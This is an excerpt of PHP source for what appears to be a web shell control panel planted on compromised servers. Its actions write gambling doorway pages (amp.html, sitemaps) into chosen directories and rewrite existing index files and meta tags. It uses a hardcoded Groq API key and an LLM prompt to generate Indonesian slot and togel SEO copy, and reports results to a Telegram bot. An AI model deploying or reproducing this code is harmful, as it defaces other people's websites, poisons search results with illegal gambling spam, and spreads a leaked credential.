...
function td_root() {
    ...
    $byFile = realpath(dirname(__FILE__));
    if ($byFile !== false) return $byFile;
    return getcwd();
}
function td_san($p) {
...
function td_actions() {
    ...
    if ($act==='canon_paste' && isset($_POST['canon_code'],$_POST['canon_fname'])) {
        ...
        $cpBrand     = isset($_POST['canon_brand']) && trim($_POST['canon_brand'])!=='' ? htmlspecialchars(strip_tags(trim($_POST['canon_brand']))) : 'DEWASLOT77';

        $groqKey     = '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';
        $defaultKwPool = array('slot gacor','slot online terpercaya','togel online resmi','toto slot gacor','slot RTP tertinggi','slot jackpot terbesar','slot gacor hari ini','link alternatif slot','situs slot terbaik','slot bonus new member');
        $cpKwRaw = isset($_POST['canon_keywords']) ? trim($_POST['canon_keywords']) : '';
        if ($cpKwRaw !== '') {
            $cpKwLines = preg_split('/\r\n|\r|\n/', $cpKwRaw);
            $cpKws = array();
            foreach ($cpKwLines as $line) {
                $line = trim($line);
                if ($line !== '') $cpKws[] = $line;
            }
            $kwPool = !empty($cpKws) ? $cpKws : $defaultKwPool;
        } else {
            $kwPool = $defaultKwPool;
        }

        $ok=0; $fail=0;
        $uploadedUrls = array();

        foreach ($targets as $tidx => $t) {
            ...
            if ($isIndex) {
                ...
                $pathSeg  = implode(' > ',array_map(function($p){return ucwords(str_replace(array('-','_'),' ',$p));}, $parts));
                $lastSeg  = !empty($parts) ? ucwords(str_replace(array('-','_'),' ',end($parts))) : $host;
                $kwPick   = $kwPool[$tidx % count($kwPool)];

                $prompt  = 'Kamu SEO copywriter profesional niche slot online dan togel Indonesia.';
                $prompt .= ' Nama brand/situs: "'.$cpBrand.'".';
                $prompt .= ' Buat konten unik untuk halaman di path: "'.$dirRel.'" (konteks: '.$pathSeg.').';
                $prompt .= ' Kata kunci utama: "'.$kwPick.'".';
                $prompt .= ' Buat 3 elemen dalam bahasa Indonesia baku tanpa typo:';
                $prompt .= ' 1. title: 50-65 karakter, FORMAT WAJIB: "'.$cpBrand.' - [kata kunci] [tahun]", contoh: "'.$cpBrand.' - Slot Gacor 2026", UNIK berbeda antar halaman.';
                $prompt .= ' 2. description: 140-155 karakter, sebutkan nama brand "'.$cpBrand.'", kata kunci natural, manfaat jelas, ajakan bertindak.';
                $prompt .= ' 3. h1: 40-60 karakter, sebutkan nama brand "'.$cpBrand.'", mengandung kata kunci, berbeda dari title.';
                $prompt .= ' LARANGAN: jangan gunakan tanda kutip di dalam nilai JSON.';
                $prompt .= ' Respond HANYA JSON satu baris: {"title":"...","description":"...","h1":"..."}';
                ...
                $apiBody = json_encode(array(
                    ...
                    'temperature' => 0.88,
                    'messages'    => array(
                        array('role'=>'system','content'=>'Kamu SEO copywriter profesional slot online Indonesia. Respond hanya JSON satu baris tanpa markdown, tanpa penjelasan. Bahasa Indonesia baku, tanpa typo.'),
                ...
                if ($title === '') {
                    $kwF   = ucwords($kwPool[$tidx % count($kwPool)]);
                    $title = $cpBrand.' - '.$kwF.' '.date('Y');
                    if (strlen($title)>65) $title = $cpBrand.' '.$kwF;
                    if (strlen($title)>65) $title = $cpBrand.' Slot Gacor '.date('Y');
                    $title = substr($title,0,65);
                }
                if ($desc === '') {
                    $kwF2  = ucwords($kwPool[($tidx+1) % count($kwPool)]);
                    $desc  = $cpBrand.' situs '.ucwords($kwPool[$tidx%count($kwPool)]).' terpercaya '.date('Y').'. Nikmati '.$kwF2.' RTP tertinggi, jackpot besar, bonus new member. Daftar sekarang!';
                    $desc  = substr($desc,0,155);
                }
                if ($h1 === '') {
                    $h1 = $cpBrand.' '.ucwords($kwPool[$tidx%count($kwPool)]).' Terpercaya '.date('Y');
                    $h1 = substr($h1,0,70);
                }
            }
            ...
            if ($isIndex && $title !== '') {
                // title tag
                $content = preg_replace('/<title>\s*#\s*<\/title>/i', '<title>'.htmlspecialchars($title).'</title>', $content);
                // meta description
                $content = preg_replace('/(<meta\s[^>]*name=["\']description["\'][^>]*content=["\'])#(["\'][^>]*>)/i', '${1}'.htmlspecialchars($desc).'${2}', $content);
                $content = preg_replace('/(<meta\s[^>]*content=["\'])#(["\'][^>]*name=["\']description["\'][^>]*>)/i', '${1}'.htmlspecialchars($desc).'${2}', $content);
                // og:title
                $content = preg_replace('/(<meta\s[^>]*property=["\']og:title["\'][^>]*content=["\'])#(["\'][^>]*>)/i', '${1}'.htmlspecialchars($title).'${2}', $content);
                $content = preg_replace('/(<meta\s[^>]*content=["\'])#(["\'][^>]*property=["\']og:title["\'][^>]*>)/i', '${1}'.htmlspecialchars($title).'${2}', $content);
                // og:description
                $content = preg_replace('/(<meta\s[^>]*property=["\']og:description["\'][^>]*content=["\'])#(["\'][^>]*>)/i', '${1}'.htmlspecialchars($desc).'${2}', $content);
                $content = preg_replace('/(<meta\s[^>]*content=["\'])#(["\'][^>]*property=["\']og:description["\'][^>]*>)/i', '${1}'.htmlspecialchars($desc).'${2}', $content);
                // og:url
                $content = preg_replace('/(<meta\s[^>]*property=["\']og:url["\'][^>]*content=["\'])#(["\'][^>]*>)/i', '${1}'.htmlspecialchars($dirUrl).'${2}', $content);
                $content = preg_replace('/(<meta\s[^>]*content=["\'])#(["\'][^>]*property=["\']og:url["\'][^>]*>)/i', '${1}'.htmlspecialchars($dirUrl).'${2}', $content);
                // twitter:title
                $content = preg_replace('/(<meta\s[^>]*name=["\']twitter:title["\'][^>]*content=["\'])#(["\'][^>]*>)/i', '${1}'.htmlspecialchars($title).'${2}', $content);
                // twitter:description
                $content = preg_replace('/(<meta\s[^>]*name=["\']twitter:description["\'][^>]*content=["\'])#(["\'][^>]*>)/i', '${1}'.htmlspecialchars($desc).'${2}', $content);
                // H1 tag — ganti <h1>#</h1> atau <h1 class="...">...</h1> yang isinya #
                $content = preg_replace('/<h1([^>]*)>\s*#\s*<\/h1>/i', '<h1${1}>'.htmlspecialchars($h1).'</h1>', $content);
                // sub-heading <p>#</p> tepat setelah h1 (hanya yang isinya persis #)
                $content = preg_replace_callback('/<p([^>]*)>\s*#\s*<\/p>/i', function($m) use ($desc) {
                    return '<p'.$m[1].'>'.htmlspecialchars($desc).'</p>';
                }, $content, 1);
                // Schema JSON-LD — ganti semua nilai "#" di dalam script ld+json
                $content = preg_replace_callback(
                    '/(<script\s[^>]*type=["\']application\/ld\+json["\'][^>]*>)(.*?)(<\/script>)/is',
                    function($m) use ($dirUrl, $title, $desc) {
                        $json = $m[2];
                        $json = preg_replace('/"url"\s*:\s*"#"/', '"url": "'.addslashes($dirUrl).'"', $json);
                        $json = preg_replace('/"name"\s*:\s*"#"/', '"name": "'.addslashes($title).'"', $json);
                        $json = preg_replace('/"description"\s*:\s*"#"/', '"description": "'.addslashes($desc).'"', $json);
                        return $m[1].$json.$m[3];
                    },
                    $content
                );
            ...
            // Canonical — selalu ganti jika ada href="#" di link canonical
            $content = preg_replace_callback(
            ...
            if (@file_put_contents($dest,$content)!==false) {
                $ok++;
                $uploadedUrls[] = array('url'=>$fileUrl,'canonical'=>$dirUrl,'replaced'=>true,'title'=>$title,'h1'=>$h1);
            } else { $fail++; }
        }

        $dirCount    = count($targets);
        $tgDetail    = "File: <code>".$fname."</code>\nDirs: $dirCount | OK: $ok | Fail: $fail\n\n";
        foreach (array_slice($uploadedUrls,0,5) as $u) {
        ...
        foreach ($uploadedUrls as $u) {
            ...
            if (!empty($u['title'])) $urlHtml .= '<span class="canonical-badge" style="color:rgba(0,229,255,0.6)">&#x1F4DD; '.htmlspecialchars($u['title']).'</span>';
            if (!empty($u['h1']))    $urlHtml .= '<span class="canonical-badge" style="color:rgba(0,255,65,0.5)">&#x1F3AF; H1: '.htmlspecialchars($u['h1']).'</span>';
            $urlHtml .= '</div></div>';
        }
        $summaryText = '&#x1F4DD; CANON PASTE: '.$fname.' &rarr; '.$ok.' lokasi berhasil. Title, Desc, H1, OG, Canonical semua diganti.'.($fail?' Gagal: '.$fail.'.':'');
        $msg = array(
            'type'    => 'tunel',
            'text'    => $summaryText,
            'urls'    => $urlHtml,
    ...
    if ($act==='amp_create' && isset($_POST['amp_daftar'])) {
        $root      = !empty($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : dirname(__FILE__);
        $root      = rtrim($root, '/');
        $rawDirs   = isset($_POST['amp_dirs']) ? $_POST['amp_dirs'] : array();
        $scheme    = (isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on') ? 'https' : 'http';
        $host      = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';
        $today     = date('Y-m-d');
        $pagedevBase = 'https://auto-windphy-com.cdn.ampproject.org/c/s/'.$host;
        $ampFname  = 'amp.html';

        $brandName  = isset($_POST['amp_brand'])  ? htmlspecialchars(strip_tags(trim($_POST['amp_brand'])))  : 'DEWASLOT77';
        $linkDaftar = isset($_POST['amp_daftar'])  ? trim($_POST['amp_daftar'])  : '#';
        $linkLogin  = isset($_POST['amp_login'])   ? trim($_POST['amp_login'])   : '#';
        $copyright  = isset($_POST['amp_copy'])    ? htmlspecialchars(strip_tags(trim($_POST['amp_copy'])))   : '2024 - 2026';
        $footerText = '&copy; '.$copyright.' | '.$brandName.' x ULAR SAWAH';
        ...
        $apiKey     = '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';
        $groqModel  = 'openai/gpt-oss-120b';

        $defKw  = array('slot gacor','slot online terpercaya','togel online resmi','toto slot gacor','slot RTP tertinggi','slot jackpot terbesar','slot gacor hari ini','link alternatif slot','situs slot terbaik','slot bonus new member');
        $kwRaw  = isset($_POST['amp_keywords']) ? trim($_POST['amp_keywords']) : '';
        $kwPool = array();
        if ($kwRaw !== '') {
            foreach (preg_split('/\r\n|\r|\n/', $kwRaw) as $ln) {
                $ln = trim($ln);
        ...
        if (empty($kwPool)) $kwPool = $defKw;

        // Build targets - same way as amp_force.php yang sudah terbukti
        $targets = array();
        foreach ($rawDirs as $rd) {
            $rdClean = ltrim(str_replace('\\', '/', trim($rd)), '/');
            if ($rdClean === '') continue;
            $full = $root.DIRECTORY_SEPARATOR.$rdClean;
            if (is_dir($full)) {
                $targets[] = rtrim($full, '/');
            }
        }
        ...
        if (empty($targets)) {
            return array('type'=>'error','text'=>'&#x274C; Tidak ada direktori dipilih. Centang minimal 1 direktori di daftar sebelah kanan. rawDirs='.count($rawDirs));
        }
        ...
        foreach ($targets as $idx => $t) {
            $relPart = str_replace($root, '', $t);
            $dirRel  = '/'.trim(str_replace('\\','/',$relPart),'/').'/';
            $dirUrl  = $scheme.'://'.$host.$dirRel;
            $ampUrl  = rtrim($pagedevBase,'/').$dirRel.$ampFname;
            ...
            $prompt  = 'Kamu SEO copywriter profesional slot online Indonesia. Nama brand: "'.$brandName.'".';
            $prompt .= ' Path: "'.$dirRel.'" Kata kunci: "'.$kwPick.'".';
            $prompt .= ' Buat 4 elemen bahasa Indonesia baku tanpa typo:';
            $prompt .= ' 1.title: FORMAT "'.$brandName.' - [keyword] '.date('Y').'", 50-65 karakter.';
            $prompt .= ' 2.description: 140-155 karakter, sebut brand, keyword, ajakan bertindak.';
            $prompt .= ' 3.h1: 40-60 karakter, sebut brand dan keyword, berbeda dari title.';
            $prompt .= ' 4.cta: 2-4 kata tombol unik.';
            $prompt .= ' JANGAN gunakan tanda kutip dalam nilai JSON.';
            $prompt .= ' Respond HANYA JSON: {"title":"...","description":"...","h1":"...","cta":"..."}';
            ...
            $apiBody = json_encode(array(
                ...
                'temperature'=> 0.88,
                'messages'   => array(
                    array('role'=>'system','content'=>'Respond hanya JSON satu baris tanpa markdown. Bahasa Indonesia baku.'),
                    array('role'=>'user','content'=>$prompt),
                ),
            ));
            ...
            if ($apiResp) {
                $aj = @json_decode($apiResp, true);
                if ($aj && isset($aj['choices'][0]['message']['content'])) {
                    $raw = trim(preg_replace('/^```[a-z]*\n?|```\s*$/i','', $aj['choices'][0]['message']['content']));
                    $in  = @json_decode($raw, true);
                    if ($in) {
                        if (!empty($in['title']))       $title = substr(strip_tags(trim($in['title'])),0,65);
                        if (!empty($in['description'])) $desc  = substr(strip_tags(trim($in['description'])),0,155);
                        if (!empty($in['h1']))          $h1    = substr(strip_tags(trim($in['h1'])),0,70);
                        if (!empty($in['cta']))         $cta   = strtoupper(substr(strip_tags(trim($in['cta'])),0,30));
                    }
                }
            }

            // Fallback tanpa AI
            $kws = array('Slot Gacor','Togel Online','Slot Online','RTP Tertinggi','Slot Terpercaya');
            $kw  = $kws[$idx % count($kws)];
            if ($title === '') { $t2 = $brandName.' - '.ucwords($kwPick).' '.date('Y'); $title = strlen($t2)<=65 ? $t2 : $brandName.' - '.$kw.' '.date('Y'); }
            if ($desc  === '') $desc  = $brandName.' situs '.ucwords($kwPick).' terpercaya '.date('Y').'. RTP tertinggi, jackpot besar, bonus new member. Daftar sekarang!';
            if ($h1    === '') $h1    = $brandName.' '.ucwords($kwPick).' Terpercaya '.date('Y');
            if ($cta   === '') $cta   = array('DAFTAR SEKARANG','KLAIM BONUS','MAIN GACOR','SPIN SEKARANG','DAFTAR VIP')[$idx%5];
            $title = substr($title,0,65); $desc = substr($desc,0,155); $h1 = substr($h1,0,70);

            $schema = json_encode(array(
                '@context'=>'https://schema.org','@type'=>'WebPage',
                'name'=>$title,'description'=>$desc,'url'=>$dirUrl,'inLanguage'=>'id-ID',
...
<head>
  ...
  <meta name="keywords" content="'.htmlspecialchars($kwPick).', slot gacor, togel online">
...
'.$schema.'
  ...
  <style amp-custom>
    ...
    *{box-sizing:border-box;margin:0;padding:0}::-webkit-scrollbar{display:none}
    html{max-width:var(--maxw);margin:0 auto;background-color:var(--c-bg);background-image:url(\''.htmlspecialchars($bannerSrc).'\');background-size:cover;background-repeat:no-repeat;background-position:center;background-attachment:fixed;font-family:\'Rajdhani\',sans-serif;position:relative}
    ...
    .btn{position:relative;display:inline-block;background:linear-gradient(135deg,var(--c-red) 0%,#a30021 100%);color:var(--c-white);text-decoration:none;font-family:\'Orbitron\',sans-serif;font-weight:900;font-size:11px;text-transform:uppercase;letter-spacing:1px;padding:8px 16px;border-radius:var(--r-btn);border:1px solid rgba(255,255,255,0.5);box-shadow:0 4px 15px rgba(255,0,51,0.5),inset 0 2px 3px rgba(255,255,255,0.6);overflow:hidden}
    ...
    .abonus{display:grid;gap:12px;padding:0 12px 12px}
    .block{position:relative;display:flex;align-items:center;justify-content:center;padding:15px 20px;border-radius:var(--r-card);text-decoration:none;font-family:\'Orbitron\',sans-serif;font-weight:900;font-size:14px;letter-spacing:1.5px;color:var(--c-white);background:linear-gradient(135deg,rgba(60,0,15,0.9) 0%,rgba(15,0,3,0.95) 100%);border:1px solid var(--c-border);box-shadow:var(--shadow-hd);text-shadow:0 2px 4px rgba(0,0,0,0.9),0 0 10px rgba(255,0,51,0.8);overflow:hidden}
    ...
    #bottom-navbar ul li a{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:3px;height:var(--nav-h);text-decoration:none;color:var(--c-white);font-family:\'Orbitron\',sans-serif;font-size:10px;font-weight:700;letter-spacing:1px}
    #bottom-navbar ul li+li a{border-left:1px solid rgba(255,255,255,0.1)}
    #bottom-navbar span.material-icons{font-size:22px;color:var(--c-red);filter:drop-shadow(0 0 6px rgba(255,0,51,0.9))}
        ...
        <div class="combo-inner">
          ...
          <div class="combo-hero">
            <amp-carousel width="350" height="350" layout="responsive" type="slides" autoplay delay="2500" role="region" aria-label="'.htmlspecialchars($h1).'">
              <amp-img src="'.htmlspecialchars($bannerSrc).'" width="500" height="550" layout="responsive" alt="'.htmlspecialchars($h1).'"></amp-img>
            </amp-carousel>
          </div>
        </div>
      </div>
    ...
    <div class="bottom-navbar" id="bottom-navbar">
      <ul>
        ...
        <li><a href="'.htmlspecialchars($linkLogin).'" target="_blank" rel="nofollow noopener noreferrer"><span class="material-icons">headset_mic</span>LIVE CHAT</a></li>
            ...
            $w    = @file_put_contents($dest, $html);
            if ($w !== false) {
                $ok++;
                $fileUrl        = $scheme.'://'.$host.$dirRel.$ampFname;
                $uploadedUrls[] = array('url'=>$fileUrl,'ampurl'=>$ampUrl,'title'=>$title,'h1'=>$h1);
                $sitemapUrls[]  = $fileUrl;

                $sm  = '<?xml version="1.0" encoding="UTF-8"?>'."\n";
                $sm .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">'."\n";
                $sm .= '  <url><loc>'.htmlspecialchars($fileUrl).'</loc><lastmod>'.$today.'</lastmod><changefreq>daily</changefreq><priority>0.9</priority></url>'."\n";
                $sm .= '</urlset>';
                @file_put_contents($t.DIRECTORY_SEPARATOR.'sitemap.xml', $sm);

                $idxFile = $t.DIRECTORY_SEPARATOR.'index.html';
                if (!is_file($idxFile)) $idxFile = $t.DIRECTORY_SEPARATOR.'index.php';
                if (is_file($idxFile)) {
                    $ic = @file_get_contents($idxFile);
                    if ($ic && strpos($ic,'rel="amphtml"')===false) {
                        $ic = preg_replace('/(<\/head>)/i','<link rel="amphtml" href="'.htmlspecialchars($ampUrl)."\">\n$1",$ic,1);
                        @file_put_contents($idxFile,$ic);
                    }
                }
        ...
        $master .= '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">'."\n";
        foreach ($sitemapUrls as $su) {
            $du = preg_replace('/[^\/]+$/','',$su);
            $master .= '  <sitemap><loc>'.htmlspecialchars($du.'sitemap.xml').'</loc></sitemap>'."\n";
        }
        $master .= '</sitemapindex>';
        @file_put_contents($root.DIRECTORY_SEPARATOR.'sitemap-amp.xml', $master);
        $sitemapUrl = $scheme.'://'.$host.'/sitemap-amp.xml';

        $tgMsg = "AMP: $ok dibuat, $fail gagal dari ".count($targets)." dir\nSitemap: <code>".$sitemapUrl."</code>\n\n".implode("\n\n",array_slice($tgLines,0,5));
        td_notify($TG_TOKEN,$TG_CHATID,"\xF0\x9F\x93\xA1 AMP CREATE",$tgMsg);
        ...
        foreach ($uploadedUrls as $u) {
            ...
            $urlHtml .= '<span class="canonical-badge" style="color:rgba(0,229,255,0.6)">&#x1F4DD; '.htmlspecialchars($u['title']).'</span>';
            $urlHtml .= '</div></div>';
        }
        $urlHtml .= '<div style="margin-top:10px;padding:8px 14px;background:rgba(0,229,255,0.07);border:1px solid rgba(0,229,255,0.2);border-radius:4px;font-family:var(--mono);font-size:11px">&#x1F5FA; <a href="'.htmlspecialchars($sitemapUrl).'" target="_blank" style="color:var(--cyan)">'.htmlspecialchars($sitemapUrl).'</a></div>';

        $msg = array(
            'type'    => 'tunel',
            'text'    => '&#x26A1; AMP CREATE: '.$ok.' file dibuat, '.$fail.' gagal dari '.count($targets).' direktori. Sitemap: sitemap-amp.xml',
            'urls'    => $urlHtml,
            'count'   => count($uploadedUrls),
            'rawurls' => implode("\n",array_map(function($u){return $u['url'];},$uploadedUrls)),
        );
              ...
              <div style="display:flex;flex-direction:column;gap:10px">
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
                  ...
                  <div>
                    ...
                    <input class="form-input" type="text" name="canon_brand" placeholder="OLXTOTO / DEWASLOT77" style="font-family:var(--mono)">
                    <div style="font-size:10px;color:var(--text3);margin-top:3px;font-family:var(--mono)">Dipakai di title & H1 AI</div>
                  </div>
                </div>
                <div style="margin-top:12px;border-top:1px solid var(--border);padding-top:12px">
                    <label class="form-label">&#x1F3AF; Custom Keyword List <span style="color:var(--text3);font-weight:400;font-size:9px">(opsional — 1 keyword per baris)</span></label>
                    <textarea name="canon_keywords" id="canonKeywords"
                      style="width:100%;height:110px;resize:vertical;background:#020405;border:1px solid rgba(0,255,65,0.15);border-radius:var(--r2);color:var(--green);font-family:var(--mono);font-size:12px;line-height:1.8;padding:10px 12px;outline:none;display:block;transition:border-color .2s"
                      onfocus="this.style.borderColor='rgba(0,255,65,0.4)'"
                      onblur="this.style.borderColor='rgba(0,255,65,0.15)'"
                      placeholder="slotgacor&#10;slot gacor&#10;slot88&#10;slot pulsa&#10;slot dana&#10;..."></textarea>
                    <div style="display:flex;justify-content:space-between;margin-top:4px">
                      <div style="font-size:10px;color:var(--text3);font-family:var(--mono)">Keyword dirotasi per dir untuk title &amp; H1. Kosong = pakai default.</div>
                      <span id="canonKwCount" style="font-size:10px;color:var(--green2);font-family:var(--mono)">0 keyword</span>
                    </div>
                  </div>
        ...
        <div class="card-body">
          ...
          <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:14px">
            ...
            <div style="background:rgba(0,229,255,0.05);border:1px solid rgba(0,229,255,0.12);border-radius:var(--r2);padding:10px 12px;text-align:center">
              ...
              <div style="font-size:10px;color:var(--cyan);font-family:var(--mono);font-weight:700;word-break:break-all">auto-windphy-com.cdn.ampproject.org/c/s/domain/path/amp.html</div>
            </div>
            <div style="background:rgba(0,229,255,0.05);border:1px solid rgba(0,229,255,0.12);border-radius:var(--r2);padding:10px 12px;text-align:center">
            ...
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
              ...
              <div style="display:flex;flex-direction:column;gap:12px">
                <div style="background:var(--surface2);border:1px solid var(--border2);border-radius:var(--r2);padding:16px">
                  ...
                  <div style="margin-bottom:12px">
                    <label class="form-label">&#x1F3F7; Nama Brand</label>
                    <input class="form-input" type="text" name="amp_brand" placeholder="DEWASLOT77" style="font-family:var(--mono);font-size:12px">
                    <div style="font-size:10px;color:var(--text3);margin-top:3px;font-family:var(--mono)">Dipakai di title, H1, dan footer</div>
                  </div>
                  ...
                  <div style="margin-top:12px;border-top:1px solid var(--border);padding-top:12px">
                    <label class="form-label">&#x1F3AF; Custom Keyword List <span style="color:var(--text3);font-weight:400;font-size:9px">(opsional — 1 keyword per baris)</span></label>
                    <textarea name="amp_keywords" id="ampKeywords"
                      style="width:100%;height:130px;resize:vertical;background:#020405;border:1px solid rgba(0,229,255,0.15);border-radius:var(--r2);color:var(--green);font-family:var(--mono);font-size:12px;line-height:1.8;padding:10px 12px;outline:none;display:block;transition:border-color .2s"
                      onfocus="this.style.borderColor='rgba(0,229,255,0.4)'"
                      onblur="this.style.borderColor='rgba(0,229,255,0.15)'"
                      placeholder="slotgacor&#10;slot gacor&#10;slot88&#10;slot pulsa&#10;slot dana&#10;togel online&#10;..."></textarea>
                    <div style="display:flex;justify-content:space-between;align-items:center;margin-top:5px">
                      <div style="font-size:10px;color:var(--text3);font-family:var(--mono)">Keyword dirotasi per direktori. Kosong = pakai keyword default.</div>
                      <span id="kwCount" style="font-size:10px;color:var(--cyan);font-family:var(--mono)">0 keyword</span>
                    </div>
                  </div>
                </div>
                ...
                <div style="background:var(--surface2);border:1px solid var(--border);border-radius:var(--r2);padding:14px">
                  ...
                  <?php
                  $autoItems = array(
                    array('Title SEO','50-65 karakter, AI generate dari keyword kamu'),
                    array('Meta Description','140-155 karakter, SEO-friendly, AI generate'),
                    array('H1 Heading','Unik per dir, berbeda dari title, AI generate'),
                    array('CTA Button','Teks tombol unik per dir, AI generate'),
                    array('Canonical URL','Auto dari URL direktori masing-masing'),
                    array('Link AMP (amphtml)','Inject ke index.html/php per direktori'),
                    array('sitemap.xml','Per dir + image sitemap + master sitemap index'),
                    array('Schema JSON-LD','WebPage structured data per halaman'),
                    array('OG + Twitter Card','Meta sosial media per halaman'),
                    array('robots.txt check','Dir yang disallow otomatis dilewati'),
              ...
              <div>
                ...
                <div class="dir-select-wrap" style="border-color:rgba(0,229,255,0.1);max-height:520px" id="ampDirWrap">
                  ...
                  ?>
                  <label class="dir-item">
                    <input type="checkbox" name="amp_dirs[]" value="<?php echo htmlspecialchars(ltrim($adRel,'/')); ?>"
                      data-writable="<?php echo $adW?'1':'0'; ?>"
                      onchange="ampCount()">
                    <div class="w-dot <?php echo $adW?'w-ok':'w-no'; ?>"></div>
                    <span class="dir-path" title="<?php echo htmlspecialchars($adRel); ?>"><?php echo htmlspecialchars($adRel); ?></span>
...
(function(){
  ...
  var ckTa = document.getElementById('canonKeywords');
  var ckCt = document.getElementById('canonKwCount');
  function updateCkCount() {
    if (!ckTa||!ckCt) return;
    var lines = ckTa.value.split('\n').filter(function(l){ return l.trim()!==''; });
    ckCt.textContent = lines.length + ' keyword';
    ckCt.style.color = lines.length > 0 ? 'var(--green)' : 'var(--green2)';
  }
  if (ckTa) { ckTa.addEventListener('input', updateCkCount); updateCkCount(); }

  var kwTa = document.getElementById('ampKeywords');
  var kwCt = document.getElementById('kwCount');
  function updateKwCount() {
    if (!kwTa||!kwCt) return;
    var lines = kwTa.value.split('\n').filter(function(l){ return l.trim()!==''; });
    kwCt.textContent = lines.length + ' keyword';
    kwCt.style.color = lines.length > 0 ? 'var(--green)' : 'var(--cyan)';
  }
  if (kwTa) { kwTa.addEventListener('input', updateKwCount); updateKwCount(); }
